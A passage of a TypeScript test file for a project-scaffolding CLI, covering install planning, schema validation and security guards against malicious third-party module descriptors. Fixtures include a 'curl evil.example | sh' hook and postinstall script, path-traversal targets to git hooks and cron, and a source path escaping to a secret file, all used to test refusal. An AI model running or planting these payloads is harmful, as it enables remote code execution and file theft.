    expect(result.patched).toHaveLength(0);
    expect(result.patchRefusals).toHaveLength(1);
    expect(result.patchRefusals[0]?.patch.file).toBe(ENTRY_TARGET);
    expect(result.patchRefusals[0]?.reason).toContain("./legacy.js");
    // Nothing was applied, so `remove` must not think it has a patch to reverse here.
    expect(manifest.patches).toHaveLength(0);
  });

  it("appends a second module's link without disturbing the first", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const billing = await writeModule("billing", {
      type: "saasaloy:feature",
      dependsOn: ["api"],
      patches: [
        {
          file: ENTRY_TARGET,
          kind: "chained-route",
          exportName: "default",
          path: "/billing",
          call: "billing",
          import: { name: "billing", from: "./routes/billing.js" },
        },
      ],
    });
    const mods = [await apiWorkspace(), await waitlistWithRoute(), billing];
    await executePlan(
      await plan({
        install: ["api", "waitlist", "billing"],
        modules: mods,
        config,
        manifest,
      }),
      root,
      config,
      manifest
    );

    const entry = await readFile(
      join(root, "apps", "api", "src", "index.ts"),
      "utf-8"
    );
    expect(entry).toContain('.route("/waitlist", waitlist)');
    expect(entry).toContain('.route("/billing", billing)');
    expect(manifest.patches).toHaveLength(2);
  });
});

describe("registry-item schema — pinned deps", () => {
  it("accepts exact-pinned dependencies (plain and scoped)", async () => {
    const result = await validateRegistryItem({
      name: "waitlist",
      type: "saasaloy:feature",
      dependencies: ["zod@4.0.5"],
      devDependencies: ["@types/node@26.1.1"],
    });
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });

  it("rejects a bare (un-pinned) dependency", async () => {
    const result = await validateRegistryItem({
      name: "waitlist",
      type: "saasaloy:feature",
      dependencies: ["zod"],
    });
    expect(result.valid).toBeFalsy();
  });

  it("rejects a floating-range dependency", async () => {
    const result = await validateRegistryItem({
      name: "waitlist",
      type: "saasaloy:feature",
      dependencies: ["zod@^4.0.5"],
    });
    expect(result.valid).toBeFalsy();
  });

  it("rejects a bare devDependency", async () => {
    const result = await validateRegistryItem({
      name: "waitlist",
      type: "saasaloy:feature",
      devDependencies: ["@types/node"],
    });
    expect(result.valid).toBeFalsy();
  });
});

describe("registry-item schema — config patches", () => {
  it("accepts a patches array of a wrangler-binding op", async () => {
    const result = await validateRegistryItem({
      name: "database",
      type: "saasaloy:capability",
      patches: [
        {
          file: "apps/api/wrangler.jsonc",
          kind: "wrangler-binding",
          bindingType: "d1_databases",
          entry: { binding: "DB" },
        },
      ],
    });
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });

  it("rejects a patch op missing its file", async () => {
    const result = await validateRegistryItem({
      name: "database",
      type: "saasaloy:capability",
      patches: [
        {
          kind: "wrangler-binding",
          bindingType: "d1_databases",
          entry: { binding: "DB" },
        },
      ],
    });
    expect(result.valid).toBeFalsy();
  });

  it("rejects the legacy object-shaped patches", async () => {
    const result = await validateRegistryItem({
      name: "api",
      type: "saasaloy:capability",
      patches: {},
    });
    expect(result.valid).toBeFalsy();
  });
});

// #98 Phase 1. `add` is the one engine that consumes an untrusted remote descriptor, and
// it was the one engine without the guards `remover.ts` and `updater.ts` already use.
// These tests drive the two holes the 2026-08-30 audit named: a `..` target that escapes
// the project root, and a symlinked path component that carries an in-root write outside
// it. Each asserts the refusal, not the happy path.

// A malicious third-party descriptor: an ordinary-looking feature whose one file target
// climbs out of the alias prefix and lands on a git hook.
async function traversalModule(): Promise<LoadedModule> {
  return writeModule(
    "evil",
    {
      type: "saasaloy:feature",
      files: [
        {
          path: "files/hook.sh",
          target: "@web/../../../.git/hooks/pre-commit",
        },
      ],
    },
    { "files/hook.sh": "#!/bin/sh\ncurl evil.example | sh\n" }
  );
}

describe("buildPlan — write-path containment (#98)", () => {
  it("refuses a files[] target that climbs out of the project root", async () => {
    await expect(
      plan({
        install: ["evil"],
        modules: [await traversalModule()],
        config: { aliases: { "@web": "apps/web/src" }, installed: [] },
      })
    ).rejects.toThrow(/escapes the project root|'\.' or '\.\.' segments/);
  });

  it("refuses a scaffold target that climbs out of its workspace and the root", async () => {
    const mod = await writeModule(
      "evil",
      {
        type: "saasaloy:capability",
        scaffolds: [
          {
            workspace: "apps/api",
            files: [{ path: "files/x.ts", target: "../../../outside.ts" }],
          },
        ],
      },
      { "files/x.ts": "export {};\n" }
    );
    await expect(plan({ install: ["evil"], modules: [mod] })).rejects.toThrow(
      /Refusing to resolve/
    );
  });

  it("refuses a patches[] file outside the project root", async () => {
    const mod = await writeModule("evil", {
      type: "saasaloy:feature",
      patches: [
        {
          file: "../../.git/hooks/pre-commit",
          kind: "package-json-script",
          name: "db:generate",
          value: "drizzle-kit generate",
        },
      ],
    });
    await expect(plan({ install: ["evil"], modules: [mod] })).rejects.toThrow(
      /Refusing to resolve/
    );
  });

  it("refuses an absolute files[] target", async () => {
    const mod = await writeModule(
      "evil",
      {
        type: "saasaloy:feature",
        files: [{ path: "files/x.ts", target: "@web//etc/cron.d/evil" }],
      },
      { "files/x.ts": "export {};\n" }
    );
    await expect(
      plan({
        install: ["evil"],
        modules: [mod],
        config: { aliases: { "@web": "" }, installed: [] },
      })
    ).rejects.toThrow(/Refusing to resolve/);
  });

  it("still resolves an ordinary alias-prefixed target", async () => {
    const mod = await writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        files: [{ path: "files/x.ts", target: "@api/routes/waitlist.ts" }],
      },
      { "files/x.ts": "export {};\n" }
    );
    const p = await plan({
      install: ["waitlist"],
      modules: [mod],
      config: { aliases: { "@api": "apps/api/src" }, installed: [] },
    });
    expect(p.files[0]?.targetAbs).toBe(
      join(resolve(root), "apps", "api", "src", "routes", "waitlist.ts")
    );
  });
});

describe("executePlan — symlink refusal (#98)", () => {
  let outside: string;

  beforeEach(async () => {
    outside = await mkdtemp(join(tmpdir(), "saasaloy-outside-"));
  });

  afterEach(async () => {
    await rm(outside, { recursive: true, force: true });
  });

  it("refuses to write a module file through a symlinked directory component", async () => {
    // `apps` is a link out of the project, so the lexically-in-root write would land outside.
    await symlink(outside, join(root, "apps"), "dir");
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await apiWorkspace()],
      config,
      manifest,
    });

    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
      /is a symlink/
    );
    await expect(
      pathExists(join(outside, "api", "package.json"))
    ).resolves.toBeFalsy();
  });

  it("refuses to patch a file reached through a symlinked directory component", async () => {
    await mkdir(join(outside, "api"), { recursive: true });
    await writeFile(
      join(outside, "api", "package.json"),
      '{\n  "name": "@app/api"\n}\n',
      "utf-8"
    );
    await symlink(outside, join(root, "apps"), "dir");

    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["database"],
      modules: [await dbWithScript()],
      config,
      manifest,
    });
    expect(p.patches[0]?.action).toBe("apply");

    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
      /is a symlink/
    );
    await expect(
      readFile(join(outside, "api", "package.json"), "utf-8")
    ).resolves.not.toContain("db:generate");
  });

  it("refuses to create a skill link through a symlinked directory component", async () => {
    await symlink(outside, join(root, ".claude"), "dir");
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await skillModule()],
      config,
      manifest,
    });

    await expect(executePlan(p, root, config, manifest)).rejects.toThrow(
      /is a symlink/
    );
    await expect(pathExists(join(outside, "skills"))).resolves.toBeFalsy();
  });

  it("leaves the idempotent re-add of an existing skill link working", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mod = await skillModule();
    await executePlan(
      await plan({ install: ["api"], modules: [mod], config, manifest }),
      root,
      config,
      manifest
    );
    const second = await plan({
      install: ["api"],
      modules: [mod],
      config,
      manifest,
    });
    expect(second.links[0]?.action).toBe("exists");
    // The link we made ourselves must not trip the symlink guard on a re-add.
    const result = await executePlan(second, root, config, manifest);
    expect(result.links).toHaveLength(1);
    expect(
      (await lstat(join(root, ".claude/skills/saasaloy-api"))).isSymbolicLink()
    ).toBeTruthy();
  });
});

describe("registry-item schema — traversal-proof paths (#98)", () => {
  const traversalItem = {
    name: "evil",
    type: "saasaloy:feature" as const,
    files: [
      { path: "files/hook.sh", target: "@web/../../../.git/hooks/pre-commit" },
    ],
  };

  it("rejects the malicious descriptor outright", async () => {
    const result = await validateRegistryItem(traversalItem);
    expect(result.valid).toBeFalsy();
    expect(result.errors.join("\n")).toContain("target");
  });

  it("rejects a '.' segment in a files[] target", async () => {
    const result = await validateRegistryItem({
      name: "evil",
      type: "saasaloy:feature",
      files: [{ path: "files/x.ts", target: "@api/./x.ts" }],
    });
    expect(result.valid).toBeFalsy();
  });

  it("rejects a trailing '..' segment in a files[] target", async () => {
    const result = await validateRegistryItem({
      name: "evil",
      type: "saasaloy:feature",
      files: [{ path: "files/x.ts", target: "@api/routes/.." }],
    });
    expect(result.valid).toBeFalsy();
  });

  it("rejects a '..' segment in a scaffold target", async () => {
    const result = await validateRegistryItem({
      name: "evil",
      type: "saasaloy:capability",
      scaffolds: [
        {
          workspace: "apps/api",
          files: [{ path: "files/x.ts", target: "../../outside.ts" }],
        },
      ],
    });
    expect(result.valid).toBeFalsy();
  });

  it("rejects a '..' segment in a patches[] file", async () => {
    const result = await validateRegistryItem({
      name: "evil",
      type: "saasaloy:feature",
      patches: [
        {
          file: "apps/../../.git/hooks/pre-commit",
          kind: "package-json-script",
          name: "db:generate",
          value: "drizzle-kit generate",
        },
      ],
    });
    expect(result.valid).toBeFalsy();
  });

  it("still accepts a dot-leading file name, which is not a dot segment", async () => {
    const result = await validateRegistryItem({
      name: "api",
      type: "saasaloy:capability",
      files: [{ path: "files/gitignore", target: "@api/.gitignore" }],
      scaffolds: [
        {
          workspace: "apps/api",
          files: [{ path: "files/dev.vars", target: ".dev.vars.example" }],
        },
      ],
      patches: [
        {
          file: "apps/api/.eslintrc.json",
          kind: "package-json-script",
          name: "db:generate",
          value: "drizzle-kit generate",
        },
      ],
    });
    expect(result.errors).toStrictEqual([]);
    expect(result.valid).toBeTruthy();
  });
});

describe("applier — install-lifecycle script refusal (#98)", () => {
  // A descriptor that would earn arbitrary code execution on the victim's next install.
  async function lifecycleModule(name: string): Promise<LoadedModule> {
    return writeModule("evil", {
      type: "saasaloy:feature",
      dependsOn: ["api"],
      patches: [
        {
          file: "apps/api/package.json",
          kind: "package-json-script",
          name,
          value: "curl evil.example | sh",
        },
      ],
    });
  }

  it.each([
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
  ])("refuses a %s patch and writes nothing", async (name) => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api", "evil"],
      modules: [await apiWorkspace(), await lifecycleModule(name)],
      config,
      manifest,
    });
    expect(p.patches[0]?.action).toBe("unchanged");

    const result = await executePlan(p, root, config, manifest);

    expect(result.patched).toStrictEqual([]);
    expect(result.patchRefusals).toHaveLength(1);
    expect(result.patchRefusals[0]?.reason).toContain(name);
    const pkg = JSON.parse(
      await readFile(join(root, "apps", "api", "package.json"), "utf-8")
    ) as { scripts: Record<string, string> };
    expect(pkg.scripts).toStrictEqual({ dev: "wrangler dev" });
    // Nothing refused is tracked, so `remove` never claims to own the file.
    expect(manifest.patches).toStrictEqual([]);
  });

  it("still applies an ordinary script whose name merely starts with a lifecycle word", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api", "evil"],
      modules: [await apiWorkspace(), await lifecycleModule("installer:check")],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);
    expect(result.patched).toHaveLength(1);
  });
});

// #98 Phase 4. `add` was the one engine that trusted its own plan at write time: it
// rewrote a file it had already classified `unchanged`, and it never re-read a target
// between the confirmation prompt and the write. `remover.ts` and `updater.ts` both
// re-check. These drive the two rules through the real buildPlan/executePlan pair.

describe("executePlan — byte-identical files (#98)", () => {
  // A far-past mtime survives a run that writes nothing and is replaced by one that
  // writes, which is a sharper probe than comparing two timestamps taken seconds apart.
  const STAMP = new Date("2001-01-01T00:00:00Z");

  it("refreshes an unchanged file's manifest entry without rewriting it", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiCapability()];
    await executePlan(
      await plan({ install: ["api"], modules: mods, config, manifest }),
      root,
      config,
      manifest
    );

    const abs = join(root, "apps", "api", "src", "index.ts");
    await utimes(abs, STAMP, STAMP);
    // Drop the recorded `from` so the re-add has something to refresh: this is the
    // manifest an install predating that field leaves behind.
    const entry = manifest.managed["apps/api/src/index.ts"];
    if (entry) {
      delete entry.from;
    }

    const second = await plan({
      install: ["api"],
      modules: mods,
      config,
      manifest,
    });
    expect(second.files.every((f) => f.action === "unchanged")).toBeTruthy();

    const result = await executePlan(second, root, config, manifest);

    expect(result.written).toStrictEqual([]);
    expect(result.refreshed.map((f) => f.target)).toContain(
      "apps/api/src/index.ts"
    );
    expect((await stat(abs)).mtime.getTime()).toBe(STAMP.getTime());
    expect(manifest.managed["apps/api/src/index.ts"]).toMatchObject({
      module: "api",
      from: "files/src/index.ts",
    });
  });

  it("still writes a file whose content differs", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
      config,
      manifest,
    });
    const result = await executePlan(p, root, config, manifest);
    expect(result.written).toHaveLength(2);
    expect(result.refreshed).toStrictEqual([]);
  });
});

describe("executePlan — plan-to-execute re-check (#98)", () => {
  it("leaves a planned `create` alone when something appeared at its path", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const p = await plan({
      install: ["api"],
      modules: [await apiCapability()],
      config,
      manifest,
    });

    // The confirmation prompt is open for as long as the user takes; anything can land
    // in the gap. These bytes were never offered for overwrite.
    const abs = join(root, "apps", "api", "src", "index.ts");
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, "// mine\n", "utf-8");

    const result = await executePlan(p, root, config, manifest);

    await expect(readFile(abs, "utf-8")).resolves.toBe("// mine\n");
    expect(result.lateDrift.map((f) => f.target)).toStrictEqual([
      "apps/api/src/index.ts",
    ]);
    expect(result.written.map((f) => f.target)).toStrictEqual([
      "apps/api/package.json",
    ]);
    expect(manifest.managed["apps/api/src/index.ts"]).toBeUndefined();
  });

  it("leaves a planned `overwrite` alone when the file was edited under it", async () => {
    const config = emptyConfig();
    const manifest = emptyManifest();
    const mods = [await apiCapability()];
    await executePlan(
      await plan({ install: ["api"], modules: mods, config, manifest }),
      root,
      config,
      manifest
    );

    // Re-plan against an edited copy of what we wrote: hash still matches the manifest
    // at plan time, so the plan says `overwrite` — then the user saves again.
    const abs = join(root, "apps", "api", "src", "index.ts");
    const planned = await plan({
      install: ["api"],
      modules: mods,
      config,
      manifest,
    });
    const file = planned.files.find(
      (f) => f.target === "apps/api/src/index.ts"
    );
    expect(file?.action).toBe("unchanged");
    await writeFile(abs, "// edited while the prompt was up\n", "utf-8");

    const result = await executePlan(planned, root, config, manifest);

    await expect(readFile(abs, "utf-8")).resolves.toBe(
      "// edited while the prompt was up\n"
    );
    expect(result.lateDrift.map((f) => f.target)).toStrictEqual([
      "apps/api/src/index.ts",
    ]);
    expect(result.written).toStrictEqual([]);
  });
});

// #98 fix round. Two modules in one run can ship the same target: `database` and its
// driver `database-d1` both scaffold `packages/db/tsconfig.json`. Planned twice they
// both classified `create`, the core's copy landed first, and `stillMatches` then read
// this run's own bytes and dropped the driver's copy as late drift — so `packages/db`
// kept the core tsconfig and lost the `types` entry the driver needs.
describe("a target two modules in one run both ship", () => {
  it("lands the last planner's copy, not the first's", async () => {
    const core = await writeModule(
      "database",
      {
        type: "saasaloy:capability",
        scaffolds: [
          {
            workspace: "packages/db",
            aliases: { "@db": "packages/db/src" },
            files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
          },
        ],
      },
      { "files/tsconfig.json": '{ "types": ["vite/client"] }\n' }
    );
    const driver = await writeModule(
      "database-d1",
      {
        type: "saasaloy:capability",
        dependsOn: ["database"],
        scaffolds: [
          {
            workspace: "packages/db",
            files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
          },
        ],
      },
      {
        "files/tsconfig.json":
          '{ "types": ["@cloudflare/workers-types", "vite/client"] }\n',
      }
    );

    const config = emptyConfig();
    const manifest = emptyManifest();
    // Topological order: the driver dependsOn the core, so it plans second.
    const planned = await plan({
      install: ["database", "database-d1"],
      modules: [core, driver],
      config,
      manifest,
    });

    const entries = planned.files.filter(
      (f) => f.target === "packages/db/tsconfig.json"
    );
    expect(entries).toHaveLength(1);
    expect(entries[0]?.module).toBe("database-d1");

    const result = await executePlan(planned, root, config, manifest);

    expect(result.lateDrift).toStrictEqual([]);
    await expect(
      readFile(join(root, "packages", "db", "tsconfig.json"), "utf-8")
    ).resolves.toBe(
      '{ "types": ["@cloudflare/workers-types", "vite/client"] }\n'
    );
    expect(manifest.managed["packages/db/tsconfig.json"]?.module).toBe(
      "database-d1"
    );
  });
});

// #98 fix round. Phase 1 guarded every write target and left the read side on a bare
// `join`, which normalizes a `..` away. A third-party descriptor could therefore name a
// source outside its own module folder and copy a host file into the project.
describe("a descriptor source path that escapes the module folder", () => {
  it("is refused before anything is read", async () => {
    const secret = join(moduleRoot, "secret.txt");
    await writeFile(secret, "not yours\n", "utf-8");
    const mod = await writeModule("hostile", {
      type: "saasaloy:feature",
      files: [{ path: "../secret.txt", target: "@api/stolen.txt" }],
    });

    await expect(
      plan({
        install: ["hostile"],
        modules: [mod],
        config: { aliases: { "@api": "apps/api/src" }, installed: [] },
      })
    ).rejects.toThrow(/inside the module folder/);
  });

  it("fails the descriptor at authoring time too", async () => {
    await expect(
      validateRegistryItem({
        name: "hostile",
        type: "saasaloy:feature",
        files: [{ path: "../secret.txt", target: "@api/stolen.txt" }],
      })
    ).resolves.toMatchObject({ valid: false });
  });
});

// #91. The overlap above is legal because the driver dependsOn the core. Two modules with
// no dependsOn edge either way have nothing that says whose copy the user wanted, so the
// run is refused before a single file is classified.
describe("a target two unrelated modules in one run both ship", () => {
  it("refuses the run, naming both modules and the contested path", async () => {
    const waitlist = await writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        files: [{ path: "files/schema.ts", target: "@db/schema.ts" }],
      },
      { "files/schema.ts": "export const waitlist = {};\n" }
    );
    const blog = await writeModule(
      "blog",
      {
        type: "saasaloy:feature",
        files: [{ path: "files/schema.ts", target: "@db/schema.ts" }],
      },
      { "files/schema.ts": "export const posts = {};\n" }
    );

    const promise = plan({
      install: ["waitlist", "blog"],
      modules: [waitlist, blog],
      config: { aliases: { "@db": "packages/db/src" }, installed: [] },
    });
    await expect(promise).rejects.toThrow(RefusalError);
    await expect(promise).rejects.toThrow(
      /waitlist and blog both write packages\/db\/src\/schema\.ts/
    );
    // The refusal fires before planning, so nothing reached disk.
    await expect(
      pathExists(join(root, "packages", "db", "src", "schema.ts"))
    ).resolves.toBeFalsy();
  });

  it("catches a scaffolds[] target the same way it catches a files[] one", async () => {
    const scaffoldModule = async (name: string): Promise<LoadedModule> =>
      writeModule(
        name,
        {
          type: "saasaloy:capability",
          scaffolds: [
            {
              workspace: "packages/db",
              files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
            },
          ],
        },
        { "files/tsconfig.json": `{ "name": "${name}" }\n` }
      );

    await expect(
      plan({
        install: ["reports", "search"],
        modules: [
          await scaffoldModule("reports"),
          await scaffoldModule("search"),
        ],
      })
    ).rejects.toThrow(
      /reports and search both write packages\/db\/tsconfig\.json/
    );
  });

  it("still allows the core-plus-driver overlap through dependsOn", async () => {
    const core = await writeModule(
      "database",
      {
        type: "saasaloy:capability",
        scaffolds: [
          {
            workspace: "packages/db",
            files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
          },
        ],
      },
      { "files/tsconfig.json": '{ "types": ["vite/client"] }\n' }
    );
    const driver = await writeModule(
      "database-d1",
      {
        type: "saasaloy:capability",
        dependsOn: ["database"],
        scaffolds: [
          {
            workspace: "packages/db",
            files: [{ path: "files/tsconfig.json", target: "tsconfig.json" }],
          },
        ],
      },
      { "files/tsconfig.json": '{ "types": ["@cloudflare/workers-types"] }\n' }
    );

    const planned = await plan({
      install: ["database", "database-d1"],
      modules: [core, driver],
    });
    expect(planned.files).toHaveLength(1);
    expect(planned.files[0]?.module).toBe("database-d1");
  });
});

// #91 phase 2. The same rule against what is already installed: `classify` reads the
// owner out of `manifest.managed[target].module`, and buildPlan refuses a claimant that
// does not reach that owner through `dependsOn`. `--force` never crosses this line.
// A driver whose files[] land on `packages/db/src/`, so two drivers contest them.
const driverItem: Omit<RegistryItem, "name"> = {
  type: "saasaloy:capability",
  dependsOn: ["database"],
  files: [
    { path: "files/client.ts", target: "@db/client.ts" },
    { path: "files/drizzle.config.ts", target: "@db/drizzle.config.ts" },
  ],
};

function driverFiles(name: string): Record<string, string> {
  return {
    "files/client.ts": `export const client = "${name}";\n`,
    "files/drizzle.config.ts": `export default { dialect: "${name}" };\n`,
  };
}

describe("a target another installed module already owns", () => {
  const config: SaasaloyConfig = {
    aliases: { "@db": "packages/db/src" },
    installed: ["database", "database-d1"],
  };

  // Put d1's two files on disk and record d1 as their owner, the state `add database-d1`
  // leaves behind.
  async function installD1(): Promise<Manifest> {
    const d1 = await writeModule("database-d1", driverItem, driverFiles("d1"));
    const manifest = emptyManifest();
    const applied = await buildPlan({
      root,
      install: ["database-d1"],
      alreadyInstalled: [],
      modules: new Map([["database-d1", d1]]),
      config,
      manifest,
    });
    await executePlan(applied, root, config, manifest);
    return manifest;
  }

  it("refuses a sibling driver, naming every contested path once", async () => {
    const manifest = await installD1();
    expect(manifest.managed["packages/db/src/client.ts"]?.module).toBe(
      "database-d1"
    );
    const before = await readFile(
      join(root, "packages/db/src/client.ts"),
      "utf-8"
    );

    const promise = buildPlan({
      root,
      install: ["database-postgres"],
      alreadyInstalled: ["database", "database-d1"],
      modules: new Map([
        [
          "database-postgres",
          await writeModule("database-postgres", driverItem, driverFiles("pg")),
        ],
        [
          "database",
          await writeModule("database", { type: "saasaloy:capability" }),
        ],
      ]),
      config,
      manifest,
      requested: "database-postgres",
    });
    await expect(promise).rejects.toThrow(RefusalError);
    // One refusal, both paths, and the way through.
    const refusal = (await promise.then(
      () => new Error("expected a refusal"),
      (error: unknown) => error
    )) as Error;
    expect(refusal.message).toContain("packages/db/src/client.ts");
    expect(refusal.message).toContain("packages/db/src/drizzle.config.ts");
    expect(refusal.message).toContain("saasaloy remove database-d1");
    // Nothing was written: the refusal fires while planning, before executePlan runs.
    await expect(
      readFile(join(root, "packages/db/src/client.ts"), "utf-8")
    ).resolves.toBe(before);
  });

  it("lets a module re-apply its own file", async () => {
    const manifest = await installD1();
    const planned = await buildPlan({
      root,
      install: ["database-d1"],
      alreadyInstalled: [],
      modules: new Map([
        [
          "database-d1",
          await writeModule("database-d1", driverItem, driverFiles("d1")),
        ],
      ]),
      config,
      manifest,
    });
    expect(planned.files.map((f) => f.action)).toStrictEqual([
      "unchanged",
      "unchanged",
    ]);
  });

  it("lets a module write over a file owned by one it dependsOn", async () => {
    // `database` owns the client, and `database-d1` dependsOn it, so the driver may
    // take the file over.
    const core = await writeModule(
      "database",
      {
        type: "saasaloy:capability",
        files: [{ path: "files/client.ts", target: "@db/client.ts" }],
      },
      { "files/client.ts": "export const client = null;\n" }
    );
    const manifest = emptyManifest();
    const first = await buildPlan({
      root,
      install: ["database"],
      alreadyInstalled: [],
      modules: new Map([["database", core]]),
      config,
      manifest,
    });
    await executePlan(first, root, config, manifest);
    expect(manifest.managed["packages/db/src/client.ts"]?.module).toBe(
      "database"
    );

    const second = await buildPlan({
      root,
      install: ["database-d1"],
      alreadyInstalled: ["database"],
      modules: new Map([
        [
          "database-d1",
          await writeModule("database-d1", driverItem, driverFiles("d1")),
        ],
        ["database", core],
      ]),
      config,
      manifest,
    });
    await executePlan(second, root, config, manifest);
    expect(manifest.managed["packages/db/src/client.ts"]?.module).toBe(
      "database-d1"
    );
  });
});

// #99 Phase 1. A module whose payload is dialect-bound ships one variant per driver and
// lets the resolved install set pick. The condition is enforced in `listModuleFiles`, the
// one place the file rules live, so `add` and `update` cannot disagree about which
// variant a project holds.
describe("listModuleFiles — onlyWith (#99)", () => {
  const SQLITE = "files/db/schema/waitlist.sqlite.ts";
  const PG = "files/db/schema/waitlist.pg.ts";
  const D1_PROVIDER = "files/src/db-provider.d1.ts";
  const PG_PROVIDER = "files/src/db-provider.pg.ts";

  const aliases = { "@api": "apps/api/src", "@db": "packages/db/src" };

  // Both shapes at once: a `files[]` pair resolved through an alias, a `scaffolds[]` pair
  // resolved against the workspace, and one unconditional file beside them.
  async function dialectModule(): Promise<LoadedModule> {
    return writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        files: [
          {
            path: SQLITE,
            target: "@db/schema/waitlist.ts",
            onlyWith: "database-d1",
          },
          {
            path: PG,
            target: "@db/schema/waitlist.ts",
            onlyWith: "database-postgres",
          },
          {
            path: "files/api/routes/waitlist.ts",
            target: "@api/routes/waitlist.ts",
          },
        ],
        scaffolds: [
          {
            workspace: "packages/waitlist",
            files: [
              {
                path: D1_PROVIDER,
                target: "src/db-provider.ts",
                onlyWith: "database-d1",
              },
              {
                path: PG_PROVIDER,
                target: "src/db-provider.ts",
                onlyWith: "database-postgres",
              },
            ],
          },
        ],
      },
      {
        [SQLITE]: "export const waitlist = sqliteTable();\n",
        [PG]: "export const waitlist = pgTable();\n",
        [D1_PROVIDER]: "export const provider = 'sqlite';\n",
        [PG_PROVIDER]: "export const provider = 'pg';\n",
        "files/api/routes/waitlist.ts": "export const waitlistRoute = 1;\n",
      }
    );
  }

  it("picks the sqlite variant under database-d1", async () => {
    const mod = await dialectModule();
    const files = await listModuleFiles(
      mod,
      aliases,
      new Set(["waitlist", "database", "database-d1"])
    );

    expect(files.get("packages/db/src/schema/waitlist.ts")?.from).toBe(SQLITE);
    expect(files.get("packages/waitlist/src/db-provider.ts")?.from).toBe(
      D1_PROVIDER
    );
    // One entry per target, never both variants.
    expect([...files.keys()].toSorted()).toStrictEqual([
      "apps/api/src/routes/waitlist.ts",
      "packages/db/src/schema/waitlist.ts",
      "packages/waitlist/src/db-provider.ts",
    ]);
  });

  it("picks the pg variant under database-postgres", async () => {
    const mod = await dialectModule();
    const files = await listModuleFiles(
      mod,
      aliases,
      new Set(["waitlist", "database", "database-postgres"])
    );

    expect(files.get("packages/db/src/schema/waitlist.ts")?.from).toBe(PG);
    expect(files.get("packages/waitlist/src/db-provider.ts")?.from).toBe(
      PG_PROVIDER
    );
  });

  it("leaves an unconditional file alone whatever is installed", async () => {
    const mod = await dialectModule();
    const files = await listModuleFiles(mod, aliases, new Set(["waitlist"]));

    expect(files.get("apps/api/src/routes/waitlist.ts")?.from).toBe(
      "files/api/routes/waitlist.ts"
    );
  });

  it("marks the chosen ref with the condition that chose it", async () => {
    const mod = await dialectModule();
    const files = await listModuleFiles(
      mod,
      aliases,
      new Set(["waitlist", "database-d1"])
    );

    expect(files.get("packages/db/src/schema/waitlist.ts")?.onlyWith).toBe(
      "database-d1"
    );
    expect(
      files.get("apps/api/src/routes/waitlist.ts")?.onlyWith
    ).toBeUndefined();
  });

  it("reports a target whose every candidate is conditional and unmatched", async () => {
    const mod = await dialectModule();
    const { files, unmatched } = await selectModuleFiles(
      mod,
      aliases,
      new Set(["waitlist"])
    );

    expect(files.has("packages/db/src/schema/waitlist.ts")).toBeFalsy();
    expect(unmatched).toStrictEqual([
      {
        module: "waitlist",
        target: "packages/db/src/schema/waitlist.ts",
        candidates: [
          { from: SQLITE, onlyWith: "database-d1" },
          { from: PG, onlyWith: "database-postgres" },
        ],
      },
      {
        module: "waitlist",
        target: "packages/waitlist/src/db-provider.ts",
        candidates: [
          { from: D1_PROVIDER, onlyWith: "database-d1" },
          { from: PG_PROVIDER, onlyWith: "database-postgres" },
        ],
      },
    ]);
  });

  it("accepts two variants of one target as a valid descriptor", async () => {
    await expect(
      validateRegistryItem({
        name: "waitlist",
        type: "saasaloy:feature",
        files: [
          {
            path: SQLITE,
            target: "@db/schema/waitlist.ts",
            onlyWith: "database-d1",
          },
          {
            path: PG,
            target: "@db/schema/waitlist.ts",
            onlyWith: "database-postgres",
          },
        ],
      })
    ).resolves.toMatchObject({ valid: true });
  });
});

const withDb = (installed: string[]): SaasaloyConfig => ({
  aliases: { "@db": "packages/db/src" },
  installed,
});

describe("buildPlan — onlyWith (#99)", () => {
  const SQLITE = "files/schema.sqlite.ts";
  const PG = "files/schema.pg.ts";

  async function waitlist(): Promise<LoadedModule> {
    return writeModule(
      "waitlist",
      {
        type: "saasaloy:feature",
        files: [
          { path: SQLITE, target: "@db/schema.ts", onlyWith: "database-d1" },
          {
            path: PG,
            target: "@db/schema.ts",
            onlyWith: "database-postgres",
          },
        ],
      },
      { [SQLITE]: "sqlite\n", [PG]: "pg\n" }
    );
  }

  it("plans the variant the driver in this run's graph selects", async () => {
    const result = await plan({
      install: ["database-postgres", "waitlist"],
      modules: [await waitlist()],
      config: withDb([]),
    });

    expect(result.files).toHaveLength(1);
    expect(result.files[0]?.content).toBe("pg\n");
    expect(result.files[0]?.from).toBe(PG);
  });

  it("plans the variant an already-installed driver selects", async () => {
    const result = await plan({
      install: ["waitlist"],
      modules: [await waitlist()],
      config: withDb(["database", "database-d1"]),
    });

    expect(result.files[0]?.content).toBe("sqlite\n");
  });

  it("refuses when no variant matches, naming the target and every candidate", async () => {
    await expect(
      plan({
        install: ["waitlist"],
        modules: [await waitlist()],
        config: withDb([]),
      })
    ).rejects.toThrow(
      /packages\/db\/src\/schema\.ts[\s\S]*files\/schema\.sqlite\.ts[\s\S]*database-d1[\s\S]*files\/schema\.pg\.ts[\s\S]*database-postgres/
    );
  });

  it("refuses by design, so `add` exits 2 rather than 1", async () => {
